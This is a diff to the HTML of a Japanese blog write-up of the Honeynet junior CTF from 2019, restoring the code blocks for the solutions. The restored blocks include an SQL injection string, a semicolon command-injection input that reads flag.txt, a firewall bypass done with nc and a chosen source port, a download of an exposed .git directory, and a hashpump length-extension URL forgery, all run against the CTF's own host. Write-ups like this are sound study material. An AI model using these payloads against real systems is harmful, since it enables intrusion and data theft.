@@ -48,7 +48,7 @@
 <meta itemprop="description" content="https://www.reddit.com/r/netsec/new/を見ていたら、たまたまCTFを見つけたのでやってみました。 Junior CTFな">
 <meta itemprop="datePublished" content="2019-06-03T00:00:00&#43;08:00" />
 <meta itemprop="dateModified" content="2019-06-03T07:33:00&#43;08:00" />
-<meta itemprop="wordCount" content="3887">
+<meta itemprop="wordCount" content="4260">
 
 
 
@@ -233,15 +233,15 @@
 </div>
     <div class="post-content">
       <p><a href="https://www.reddit.com/r/netsec/new/"><a href="https://www.reddit.com/r/netsec/new/">https://www.reddit.com/r/netsec/new/</a></a>を見ていたら、たまたまCTFを見つけたのでやってみました。
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 Junior CTFなので簡単なものがほとんどですが、Hardの2つとわけがわからないやつ1つが解けませんでした。。
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 同じタイミングでFacebook CTFもやってましたけど、こっちの方が楽しかったのでFacebook CTFの方は放置プレイしました。
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 参加者が少なかったのもあって、全体の中で14番でした^^
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted --></p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<br />
+<img src="https://captureamerica.github.io/writeups/img/honey_rank.png" alt="honey_rank.png"></p>
+<p><br /><br /></p>
 <h1 id="too-meta-easy-imageforensics">Too Meta (easy, image-forensics)</h1>
 <hr>
 <h2 id="challenge">Challenge</h2>
@@ -254,8 +254,8 @@ Junior CTFなので簡単なものがほとんどですが、Hardの2つとわ�
 </ul>
 <h2 id="solution">Solution</h2>
 <p>ExifTool</p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="dns-records-easy-network">DNS Records (easy, network)</h1>
 <hr>
 <blockquote>
@@ -263,8 +263,8 @@ Junior CTFなので簡単なものがほとんどですが、Hardの2つとわ�
 </blockquote>
 <h2 id="solution1">Solution</h2>
 <p>$ dig @8.8.8.8 hi.ls txt</p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="wanna-buy-a-flag-easy-network">Wanna buy a flag? (easy, network)</h1>
 <hr>
 <blockquote>
@@ -276,8 +276,8 @@ Junior CTFなので簡単なものがほとんどですが、Hardの2つとわ�
 </ul>
 <h2 id="solution2">Solution</h2>
 <p>Wireshark -&gt; Follow TCP stream</p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="find-the-flag-easy-binary">Find The Flag (easy, binary)</h1>
 <hr>
 <blockquote>
@@ -289,8 +289,8 @@ Junior CTFなので簡単なものがほとんどですが、Hardの2つとわ�
 </ul>
 <h2 id="solution3">Solution</h2>
 <p>strings &amp; grep</p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="antivaxx-easy-web">Anti-Vaxx (easy, web)</h1>
 <hr>
 <blockquote>
@@ -298,39 +298,44 @@ Junior CTFなので簡単なものがほとんどですが、Hardの2つとわ�
 </blockquote>
 <h2 id="solution4">Solution</h2>
 <p>view sourceで、&ldquo;OWASP A1:2107&quot;が見つかります。ググったら、よくあるSQL Injectionなのがわかります。</p>
-<!-- raw HTML omitted -->
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<pre>' or '1'='1</pre>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="prime-factory-easy-crypto">Prime Factory (easy, crypto)</h1>
 <hr>
 <blockquote>
-<p>The following two numbers have three prime factors each. Take the largest prime factor x, and submit it as a flag like so: _<em>flag</em>_{x}.<!-- raw HTML omitted -->
+<p>The following two numbers have three prime factors each. Take the largest prime factor x, and submit it as a flag like so: _<em>flag</em>_{x}.<br />
 786157563836987543027608510735334168859
 275030867366686996969667414354528430922804392211206745642631729</p>
 </blockquote>
 <h2 id="solution5">Solution</h2>
 <p><a href="http://factordb.com/index.php"><a href="http://factordb.com/index.php">http://factordb.com/index.php</a></a> で、factorize。</p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="port-scanning-easy-network">Port Scanning (easy, network)</h1>
 <hr>
 <blockquote>
 <p>Knock, knock!
-<!-- raw HTML omitted -->
+<br />
     Who's there?
-<!-- raw HTML omitted -->
+<br />
 A hidden service running on ctf.honeynet.org, but we won't tell you where.
-<!-- raw HTML omitted -->
+<br />
     ctf.honeynet.org who?
-<!-- raw HTML omitted -->
+<br />
 Port 9000?10000, stop asking bruh!</p>
 </blockquote>
 <h2 id="solution6">Solution</h2>
 <p><code>nmap -sT ctf.honeynet.org -p 9000-10000</code>で、ポート9413がオープンなのがわかります。NetCatで繋ぐと、&ldquo;Knock, knock!&ldquo;とくるので、&ldquo;Who's there?&ldquo;を返すとフラグが取れます。</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<pre>
+$ nc -v ctf.honeynet.org 9413
+Connection to ctf.honeynet.org 9413 port [tcp/*] succeeded!
+Knock, knock!
+Who's there?
+\__flag__{a167a64775aee31037855cdf4386a04d}
+</pre>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="systeme-anwendungen-produkte-easy-web">Systeme, Anwendungen, Produkte. (easy, web)</h1>
 <hr>
 <blockquote>
@@ -338,10 +343,11 @@ Port 9000?10000, stop asking bruh!</p>
 </blockquote>
 <h2 id="solution7">Solution</h2>
 <p>ウェブサイトにアクセスすると、&ldquo;This website only works on Internet Explorer 6&rdquo; と出るので、User-Agentを変えればOK。</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<pre>
+wget -O - "http://ctf.honeynet.org:8204/" --user-agent="Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
+</pre>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="sharks-easy-network">Sharks (easy, network)</h1>
 <hr>
 <blockquote>
@@ -353,8 +359,8 @@ Port 9000?10000, stop asking bruh!</p>
 </ul>
 <h2 id="solution8">Solution</h2>
 <p>WireSharkで、httpのobjectをexport。</p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="texture-easy-imageforensics">Texture (easy, image-forensics)</h1>
 <hr>
 <blockquote>
@@ -366,38 +372,60 @@ Port 9000?10000, stop asking bruh!</p>
 </ul>
 <h2 id="solution9">Solution</h2>
 <p>「青い空を見上げればいつもそこに白い猫」のステガノグラフィー解析より、灰色ピクセルを強調。
-<!-- raw HTML omitted -->
+<br />
 フラグの文字列は右下に出るので、フルスクリーンにしておかないと見逃すかも。</p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="there-is-no-such-thing-as-a-free-flag-easy-network">There is no such thing as a free flag (easy, network)</h1>
 <hr>
 <blockquote>
 <p>You have asked the organizers to give you a flag for free. &ldquo;Sure&rdquo;, they said, &ldquo;just go to <a href="http://ctf.honeynet.org:8101/flag.txt">http://ctf.honeynet.org:8101/flag.txt</a> and get it!&rdquo;
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 Unfortunately, it looks like someone put firewall rules in place that will prevent you from simply opening the URL in your favorite web browser&hellip; can you find a way around?
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 iptables_rules.txt
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 If you do this from your home network, Network Address Translation will get into your way.</p>
 </blockquote>
 <p>Attachment:</p>
 <ul>
 <li>iptables_rules.txt</li>
 </ul>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
+<pre>
+Chain firewall (1 references)
+target     prot opt source               destination
+REJECT     udp  --  0.0.0.0/0            0.0.0.0/0
+ACCEPT     icmp --  0.0.0.0/0            0.0.0.0/0
+ACCEPT     all  --  0.0.0.0/0            0.0.0.0/0            MAC 11:22:33:AA:BB:CC
+ACCEPT     all  --  192.168.1.42         0.0.0.0/0
+ACCEPT     all  --  0.0.0.0/0            192.168.1.42
+LOG        all  --  0.0.0.0/0            0.0.0.0/0            limit: avg 3/min burst 5 LOG level warning prefix "[UFW LIMIT BLOCK] "
+ACCEPT     tcp  --  0.0.0.0/0            0.0.0.0/0            tcp dpt:8000
+REJECT     tcp  --  0.0.0.0/0            0.0.0.0/0            tcp spts:1024:65535 reject-with tcp-reset
+ACCEPT     tcp  --  0.0.0.0/0            0.0.0.0/0
+</pre>
 <h2 id="solution10">Solution</h2>
 <p>上から順番に見ていくと、当たってしまうルールは以下なのがわかります。</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
+<pre>
+REJECT     tcp  --  0.0.0.0/0            0.0.0.0/0            tcp spts:1024:65535 reject-with tcp-reset
+</pre>
 <p>問題の最後の一文（&ldquo;If you do this ~&rdquo;）は、ホームネットワークでNAPTしてる場合は気をつけてね、の意味ですね。
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 送信元ポートをルールの範囲外にしてやって、GETを送るとフラグが返ってきます。（HTTPヘッダの終わりを示すため、エンターは2回押します。）</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<pre>
+$ nc ctf.honeynet.org 8101 -p 1023
+GET /flag.txt HTTP/1.1
+
+HTTP/1.1 200 OK
+Content-Type: text/plain; charset=utf-8
+Content-Length: 42
+Date: Sat, 01 Jun 2019 03:22:37 GMT
+Server: Python/3.7 aiohttp/3.5.4
+
+\__flag__{155ece9cf99a4de280a166f8100f947b}
+</pre>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="weird-website-easy-network">Weird Website (easy, network)</h1>
 <hr>
 <blockquote>
@@ -409,13 +437,13 @@ If you do this from your home network, Network Address Translation will get into
 </ul>
 <h2 id="solution11">Solution</h2>
 <p><a href="http://codertab.com/JsUnFuck"><a href="http://codertab.com/JsUnFuck">http://codertab.com/JsUnFuck</a></a></p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="superbank-easy-network-multistage">SuperBank (easy, network, multi-stage)</h1>
 <hr>
 <blockquote>
 <p>@maximilianhils decided that honeypots aren't challenging enough, so he went out and started a new venture: a blockchain-powered console-based banking app. The first prototype is ready and he happily gives you beta access to test things out. Such excite!
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 To start things off, download the superbank client and log into your account with the credentials below. Take your own initial balance x, and submit it as a flag like so: _<em>flag</em>_{x}.</p>
 </blockquote>
 <p>Attachment:</p>
@@ -426,11 +454,18 @@ To start things off, download the superbank client and log into your account wit
 </ul>
 <h2 id="solution12">Solution</h2>
 <p>問題の中で、API Endpoint, Username, PINが与えられます。添付されているプログラムを実行すると、それらを入力するようになっているので入力すると、以下に見えるように最初は42トークンを持っているようなので、</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
+<pre>
+\================================================================
+💰 Welcome to SuperBank, the first blockchain-enabled super bank!
+\================================================================
+Currently registered accounts:
+ - @maximilianhils (5226 tokens)
+ - @projecthoneynet (4732 tokens)
+ - メールアドレス (42 tokens, that's you!)
+</pre>
 <p><code>__flag__{42}</code>が答え。</p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="superbanknotes-">SuperBankNotes (?)</h1>
 <hr>
 <blockquote>
@@ -438,8 +473,8 @@ To start things off, download the superbank client and log into your account wit
 </blockquote>
 <h2 id="not-solved">(Not solved)</h2>
 <p>カテゴリも付いていない。ちょっと降参。</p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="hashingasaservice-medium-web">(H)ashing-as-a-Service (medium, web)</h1>
 <hr>
 <blockquote>
@@ -447,14 +482,18 @@ To start things off, download the superbank client and log into your account wit
 </blockquote>
 <h2 id="solution13">Solution</h2>
 <p>コマンドインジェクション。セミコロンで区切ると、2つ目がコマンドとして実行される。
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 入力：<code>aaa;cat flag.txt;aaa</code>
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 結果：</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<pre>
+aaa
+\__flag__{7de16dbb910d2f0a6736944cd9a531ca}
+ash: aaa: not found
+SHA-256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+</pre>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="terrific-encryption-medium-cryptography">Terrific Encryption (medium, cryptography)</h1>
 <hr>
 <blockquote>
@@ -513,9 +552,9 @@ To start things off, download the superbank client and log into your account wit
 </div>
 </div><h2 id="solution14">Solution</h2>
 <p>コードを読み解くと、入力したmsgの部分と、cur_timeはそれぞれ計算されて連結されてるだけなのがわかります。
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 具体的に言うと、添付されているflag (encrypted)は、42バイトのフラグ文字列をencryptしたものと、日時の18バイトをencryptしたものの連結です。
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 randで乱数を使ってますが、random.seedに固定値を入れると、毎回同じ乱数が取れるはずです。ということで、まずは末尾にある18バイトをdecryptしてcur_timeを求め、それを使ってflagをデコードする、という手順になります。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -587,7 +626,7 @@ randで乱数を使ってますが、random.seedに固定値を入れると、�
 <span class="p">}</span>
 </code></pre></td></tr></table>
 </div>
-</div><p><!-- raw HTML omitted --><!-- raw HTML omitted -->
+</div><p><br /><br />
 これで、cur_time（b'1559186793.7909977&rsquo;）が取得できたので、それを使って乱数を42バイト作ります。ここだけpythonを使いました。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -613,7 +652,7 @@ randで乱数を使ってますが、random.seedに固定値を入れると、�
 <span class="k">print</span><span class="p">(</span><span class="sa"></span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
 </code></pre></td></tr></table>
 </div>
-</div><p><!-- raw HTML omitted --><!-- raw HTML omitted -->
+</div><p><br /><br />
 真ん中あたりから下の部分が追加したところです。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -711,8 +750,8 @@ randで乱数を使ってますが、random.seedに固定値を入れると、�
 <span class="p">}</span>
 </code></pre></td></tr></table>
 </div>
-</div><p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+</div><p><br /><br />
+<br /><br /></p>
 <h1 id="you-know-the-rules-and-so-do-i--medium-imageforensics">You know the rules, and so do I&hellip; ?? (medium, image-forensics)</h1>
 <hr>
 <blockquote>
@@ -724,16 +763,16 @@ randで乱数を使ってますが、random.seedに固定値を入れると、�
 </ul>
 <h2 id="solution15">Solution</h2>
 <p>「青い空を見上げればいつもそこに白い猫」のステガノグラフィー解析、ビット抽出へ行くと、フラグっぽいのが見えます。
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br />
+<img src="https://captureamerica.github.io/writeups/img/bit_extract.png" alt="bit_extract.png">
+<br /><br />
 ただし、ところどころFFで埋まっていて文字が不明な箇所があります。保存ボタンでバイナリを保存し、エディタでチェックしていきます。
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 不明な文字は、他の箇所を探していると見つかります。
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted --></p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<br />
+<img src="https://captureamerica.github.io/writeups/img/bin_check.png" alt="bin_check.png"></p>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="coinflip-medium-binary">CoinFlip (medium, binary)</h1>
 <hr>
 <blockquote>
@@ -744,12 +783,12 @@ randで乱数を使ってますが、random.seedに固定値を入れると、�
 <li>coinflip.exe</li>
 </ul>
 <h2 id="solution16">Solution</h2>
-<p>coinflipに100回勝つとフラグが取れる、ってやつでした。いろんな解法があると思います。自分はx32dbg.exeで解きました。<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-rand()を使っている00401633のところをnopで埋めて（バイナリ -&gt; nopで埋める）、先にブレークポイントをセットしておいてから、エンターを押し続ける。<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<p>coinflipに100回勝つとフラグが取れる、ってやつでした。いろんな解法があると思います。自分はx32dbg.exeで解きました。<br />
+<br />
+rand()を使っている00401633のところをnopで埋めて（バイナリ -&gt; nopで埋める）、先にブレークポイントをセットしておいてから、エンターを押し続ける。<br /><br />
 ステップで進めていたら、そのうちフラグが見つかります。</p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="git-exposed-medium-web">Git Exposed (medium, web)</h1>
 <hr>
 <blockquote>
@@ -757,15 +796,37 @@ rand()を使っている00401633のところをnopで埋めて（バイナリ -&
 </blockquote>
 <h2 id="solution17">Solution</h2>
 <p>サイトにアクセスし、view page sourceした後、/files/ディレクトリを見ると、todo.txtというファイルが見つかります。</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
+<pre>
+1. build website
+2. git add --all
+3. git commit -m "done"
+4. git push -f
+5. rsync -a . /etc/nginx/html/
+6. make local copy of everything with \`wget -r`
+7. save world
+</pre>
 <p>rsyncで、.gitフォルダを含めて丸ごとアップロードしちゃった、みたいなやつですかね。
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 6行目にヒントがあって、<code>wget -r http://ctf.honeynet.org:8200/.git/</code>をしてローカルに持ってきたあとに、gitコマンドでヒストリーをチェックするとフラグが見つかります。</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<pre>
+\# git log -p --all --full-history
+commit 0918300e45171c89bbdfffa71120df01b77b1c46 (HEAD -> master)
+Author: Maximilian Hils \<git@maximilianhils.com>
+Date:   Thu Mar 14 21:03:52 2019 +0100
+\
+    oops! delete private files
+\
+diff --git a/files/flag.txt b/files/flag.txt
+deleted file mode 100644
+index c047bcb..0000000
+--- a/files/flag.txt
++++ /dev/null
+@@ -1 +0,0 @@
+-\__flag__{c97c255bd3bad6d77e0b6694abea908c}
+\ No newline at end of file
+</pre>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="hidden-in-plain-sight-medium-misc">Hidden in Plain Sight (medium, misc)</h1>
 <hr>
 <blockquote>
@@ -773,32 +834,34 @@ rand()を使っている00401633のところをnopで埋めて（バイナリ -&
 </blockquote>
 <h2 id="solution18">Solution</h2>
 <p>これは説明がなにもないんですが、タイトルより、なにか文字があるけど見えないよ、みたいなことだとわかります。
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 Inspect Elementすると、&lt;small&gt;に囲まれた文字列があって、クリップボード経由でコピペしてもエディタ上では?????になってしまいます。
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 Burp Suite経由でアクセスしたら、以下が取れました。</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<p><!-- raw HTML omitted -->
+<pre>
+\u2007\u202f\u2007\u202f\u202f\u202f\u202f\u202f \u2007\u202f\u2007\u202f\u202f\u202f\u202f\u202f \u2007\u202f\u202f\u2007\u2007\u202f\u202f\u2007 \u2007\u202f\u202f\u2007\u202f\u202f\u2007\u2007 \u2007\u202f\u202f\u2007\u2007\u2007\u2007\u202f \u2007\u202f\u202f\u2007\u2007\u202f\u202f\u202f \u2007\u202f\u2007\u202f\u202f\u202f\u202f\u202f \u2007\u202f\u2007\u202f\u202f\u202f\u202f\u202f \u2007\u202f\u202f\u202f\u202f\u2007\u202f\u202f \u2007\u2007\u202f\u202f\u2007\u202f\u2007\u202f \u2007\u2007\u202f\u202f\u2007\u202f\u202f\u2007 \u2007\u202f\u202f\u2007\u2007\u202f\u2007\u202f \u2007\u2007\u202f\u202f\u2007\u202f\u2007\u202f \u2007\u2007\u202f\u202f\u2007\u2007\u2007\u2007 \u2007\u202f\u202f\u2007\u2007\u202f\u202f\u2007 \u2007\u2007\u202f\u202f\u2007\u2007\u2007\u202f \u2007\u2007\u202f\u202f\u202f\u2007\u2007\u2007 \u2007\u202f\u202f\u2007\u2007\u2007\u202f\u2007 \u2007\u2007\u202f\u202f\u2007\u202f\u202f\u2007 \u2007\u2007\u202f\u202f\u2007\u202f\u2007\u2007 \u2007\u2007\u202f\u202f\u2007\u202f\u202f\u202f \u2007\u202f\u202f\u2007\u2007\u202f\u2007\u2007 \u2007\u2007\u202f\u202f\u202f\u2007\u2007\u2007 \u2007\u2007\u202f\u202f\u2007\u2007\u2007\u2007 \u2007\u202f\u202f\u2007\u2007\u202f\u2007\u2007 \u2007\u2007\u202f\u202f\u2007\u2007\u2007\u2007 \u2007\u2007\u202f\u202f\u2007\u2007\u2007\u202f \u2007\u2007\u202f\u202f\u202f\u2007\u2007\u2007 \u2007\u202f\u202f\u2007\u2007\u2007\u202f\u202f \u2007\u202f\u202f\u2007\u2007\u202f\u202f\u2007 \u2007\u2007\u202f\u202f\u2007\u2007\u202f\u2007 \u2007\u2007\u202f\u202f\u2007\u202f\u2007\u2007 \u2007\u2007\u202f\u202f\u2007\u2007\u202f\u202f \u2007\u202f\u202f\u2007\u2007\u202f\u2007\u2007 \u2007\u202f\u202f\u2007\u2007\u2007\u202f\u202f \u2007\u202f\u202f\u2007\u2007\u2007\u2007\u202f \u2007\u2007\u202f\u202f\u2007\u2007\u202f\u202f \u2007\u202f\u202f\u2007\u2007\u202f\u2007\u2007 \u2007\u2007\u202f\u202f\u2007\u2007\u202f\u202f \u2007\u2007\u202f\u202f\u2007\u2007\u202f\u2007 \u2007\u2007\u202f\u202f\u202f\u2007\u2007\u2007 \u2007\u202f\u202f\u202f\u202f\u202f\u2007\u202f
+</pre>
+<p><br />
 出てくるものは以下の2パターンです。
-<!-- raw HTML omitted -->
+<br />
 \u2007: FIGURE SPACE
-<!-- raw HTML omitted -->
+<br />
 \u202f: NARROW NO-BREAK SPACE</p>
 <p>それぞれ以下のように置換してみると、
-<!-- raw HTML omitted -->
+<br />
 \u2007 ==&gt; 0
-<!-- raw HTML omitted -->
+<br />
 \u202f ==&gt; 1</p>
-<p><!-- raw HTML omitted -->
+<p><br />
 こうなります。文字列を2進数で表記したもののようですね。</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
+<pre>
+01011111 01011111 01100110 01101100 01100001 01100111 01011111 01011111 01111011 00110101 00110110 01100101 00110101 00110000 01100110 00110001 00111000 01100010 00110110 00110100 00110111 01100100 00111000 00110000 01100100 00110000 00110001 00111000 01100011 01100110 00110010 00110100 00110011 01100100 01100011 01100001 00110011 01100100 00110011 00110010 00111000 01111101
+</pre>
 <p>以下のサイトでデコードしました。
-<!-- raw HTML omitted -->
+<br />
 <a href="https://dencode.com/ja/string/bin"><a href="https://dencode.com/ja/string/bin">https://dencode.com/ja/string/bin</a></a></p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="directory-listing-hard-cryptography">Directory Listing (hard, cryptography)</h1>
 <hr>
 <blockquote>
@@ -969,29 +1032,35 @@ Burp Suite経由でアクセスしたら、以下が取れました。</p>
 </div>
 </div><h2 id="solution19">Solution</h2>
 <p>ご親切に、lecture-slides.pdfというのがついていて、hash length extension attacksをしてください、というもの。
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<br /><br /></p>
 <p>サーバのView page sourceより、ネコちゃん画像（とsecret）を元に計算されたHash値を使うことにします。</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<p><!-- raw HTML omitted -->
+<pre>
+"/download?file=cute_kitten.jpg&sig=70e329b3366e0462ebb45572c178e09ebe5d4f56">cute_kitten.jpg
+</pre>
+<p><br />
 Macにて、hashpumpをかけます。</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<p><!-- raw HTML omitted -->
+<pre>
+$ hashpump -s 70e329b3366e0462ebb45572c178e09ebe5d4f56 -d "/download?file=cute_kitten.jpg" -a "&file=flag.txt" -k 16
+412b86f5852ba2363928dd5d2363c6b554e99bb3
+/download?file=cute_kitten.jpg\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01p&file=flag.txt
+</pre>
+<p><br />
 これで試すと、Invalid signature for flag.txt となっちゃうんですが、flag.txtをファイル名として扱ってもらえているのはいいサインです。</p>
-<p><!-- raw HTML omitted -->
+<p><br />
 signatureを通すには、\xを%に置き換えます。</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<pre>
+http://ctf.honeynet.org:8202/download?file=cute_kitten.jpg%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01p&file=flag.txt&sig=412b86f5852ba2363928dd5d2363c6b554e99bb3
+__flag__{97397db12c32f93ac9c9bf6dc871fd1f}
+</pre>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="passworddb-hard-network">PasswordDB (hard, network)</h1>
 <hr>
 <blockquote>
 <p>Because data theft has become such a rampant problem, We have created PasswordDB, a new and secure way of storing secrets. PasswordDB's unique technology makes it possible that the password is never stored in a single location, making it the bane of attackers&rsquo; respective existences. Instead, the password is sliced into smaller parts that are stored on different machines around the world for added security.
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 To prove that our system is secure, we have stored a CTF flag in our PasswordDB instance. No way you can get it.
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 It is infeasible to brute-force all 10¹² combinations.</p>
 </blockquote>
 <p>Attachment:</p>
@@ -1002,22 +1071,22 @@ It is infeasible to brute-force all 10¹² combinations.</p>
 </ul>
 <h2 id="not-solved1">(Not solved)</h2>
 <p>降参</p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="cookiecopter-hard-cryptography-web">CookieCopter (hard, cryptography, web)</h1>
 <hr>
 <blockquote>
 <p>CookieCopter is a new service delivering locally-sourced organic cookies hot off of vintage cookie ovens straight to your location using quad-rotor GPS-enabled helicopters. The service is modeled after TacoCopter, an innovative and highly successful early contender in the airborne food delivery industry. CookieCopter is currently being tested in private beta in select locations.
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 Your goal is to order one of the special premium cookies, which comes with a flag as a side.</p>
 </blockquote>
 <h2 id="not-solved2">(Not solved)</h2>
 <p>降参</p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br />
+<br /><br /></p>
 <hr>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br />
+<br /><br /></p>
 
     </div>
 
